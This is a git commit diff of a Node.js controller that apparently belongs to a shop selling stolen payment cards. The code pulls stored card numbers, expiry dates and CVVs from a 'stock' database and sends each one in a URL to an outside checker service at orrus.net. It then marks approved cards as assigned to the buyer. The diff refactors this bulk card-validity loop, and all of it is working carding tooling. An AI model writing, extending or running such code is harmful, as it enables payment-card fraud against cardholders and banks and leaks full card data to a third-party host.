2bff680ca97e824e78d5d51c03aaa044bfd7fc61
Cristhyan Kohlhase <cristhyan.ko@outlook.com>
2019-12-10 01:45:10 -0400

    fix 20

--- src/app/controllers/TesteController.js
+++ src/app/controllers/TesteController.js
@@ -2,10 +2,11 @@ const Product = require("../models/Product");
 const Purchase = require("../models/Purchase");
 const User = require("../models/User");
 const axios = require("axios");
-const FormData = require("form-data");
 
 class TesteController {
 	async test(req, res) {
+		req.connection.setTimeout(60 * 10 * 1000);
+
 		const user = await User.findById(req.userId);
 		const { ammount } = req.body;
 
@@ -21,39 +22,43 @@ class TesteController {
 			});
 		}
 
-		var funcs = [];
-		var count = null;
-		for (let index = 0; index < ammount; index++) {
-			funcs.push(this.efetuaTeste);
-			await new Promise((resolve, reject) =>
-				this.efetuaTeste(user, null, resolve, reject)
-			)
-				.then(() => {
-					if (count === ammount) {
+		await this.efetuaTeste(user, null, ammount, 0, 200)
+			.then(result => {
+				switch (result) {
+					case 200: {
 						return res.json({
 							message: "Teste finalizado com sucesso !"
 						});
 					}
-					count = count + 1;
-				})
-				.catch(() => {
-					return res.status(400).json({
-						message:
-							"Teste finalizado por falta de cartão no estoque."
-					});
+					case 500: {
+						return res.status(400).json({
+							message:
+								"Teste finalizado por falta de cartão no estoque."
+						});
+					}
+				}
+			})
+			.catch(err => {
+				console.log(err);
+				return res.status(400).json({
+					message:
+						"Ouve um problema durante os teste, desculpe... Mas fique tranquilo voce pode começar de novo, e suas cc aprovadas não foram perdidas, elas ja estão na sua lista!."
 				});
-		}
-
-		return res.json({
-			message: "Teste finalizado com sucesso !"
-		});
+			});
 	}
 
-	async efetuaTeste(user, ccNumber, resolve, reject) {
+	async efetuaTeste(user, ccNumber, ammount, qtd, code) {
+		console.log(`Quantidade: ${qtd} - Total: ${ammount}`);
+
+		if (qtd == ammount) {
+			return code;
+		}
+
 		const totalCC = await Product.countDocuments({
 			status: "Disponivel",
 			number: { $ne: ccNumber }
 		});
+
 		const randomNumber = Math.floor(Math.random() * totalCC);
 		var data = await Product.find({
 			status: "Disponivel",
@@ -63,27 +68,21 @@ class TesteController {
 			.skip(randomNumber);
 
 		if (data.length === 0) {
-			reject();
-			return;
+			return 500;
 		}
 
 		const cc = data[0];
 
-		const infoData = `produto=100&codigoBandeira=${cc.flag}&formaPagamento=1&tentarAutenticar=nao&tipoParcelamento=2&capturarAutomaticamente=false&indicadorAutorizacao=2&cartaoNumero=${cc.number}&mes=${cc.month}&ano=${cc.year}&cartaoCodigoSeguranca=${cc.cvv}`;
-
 		const resultTest = await axios({
 			method: "get",
 			url: `http://orrus.net/b0yBase/api.php?orrus=${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`
+		}).catch(async () => {
+			code = 500;
+			code = await this.efetuaTeste(user, cc.number, ammount, qtd, code);
+			return code;
 		});
-		// console.log(resultTest.data.Retorno);
-		var result = resultTest.data.Retorno;
 
-		// if (resultTest.data.includes("Retorno")) {
-		// 	result = resultTest.data.replace(`{"Retorno":"`, "");
-		// 	result = result.replace(`"}`, "");
-		// } else {
-		// 	result = "Invalida";
-		// }
+		var result = resultTest.data.Retorno;
 
 		result = result.trim();
 
@@ -102,9 +101,17 @@ class TesteController {
 					status: "Aprovada",
 					usedBy: user.id,
 					usedDate: Date.now()
-				}).then(() => {
-					resolve();
-					return;
+				}).then(async () => {
+					code = 200;
+					qtd = qtd + 1;
+					code = await this.efetuaTeste(
+						user,
+						cc.number,
+						ammount,
+						qtd,
+						code
+					);
+					return code;
 				});
 
 				break;
@@ -116,42 +123,22 @@ class TesteController {
 					usedBy: user.id,
 					usedDate: Date.now()
 				}).then(async () => {
-					await new Promise((resolve1, reject2) =>
-						this.efetuaTeste(user, cc.number, resolve1, reject2)
-					)
-						.then(() => {
-							resolve();
-							return;
-						})
-						.catch(() => {
-							reject();
-							return;
-						});
+					code = 500;
+					code = await this.efetuaTeste(
+						user,
+						cc.number,
+						ammount,
+						qtd,
+						code
+					);
+					return code;
 				});
-				break;
-			}
 
-			case "Invalida": {
-				await Product.findByIdAndUpdate(cc.id, {
-					status: "Invalidada",
-					usedBy: user.id,
-					usedDate: Date.now()
-				}).then(async () => {
-					await new Promise((resolve1, reject2) =>
-						this.efetuaTeste(user, cc.number, resolve1, reject2)
-					)
-						.then(() => {
-							resolve();
-							return;
-						})
-						.catch(() => {
-							reject();
-							return;
-						});
-				});
 				break;
 			}
 		}
+
+		return code;
 	}
 }
 
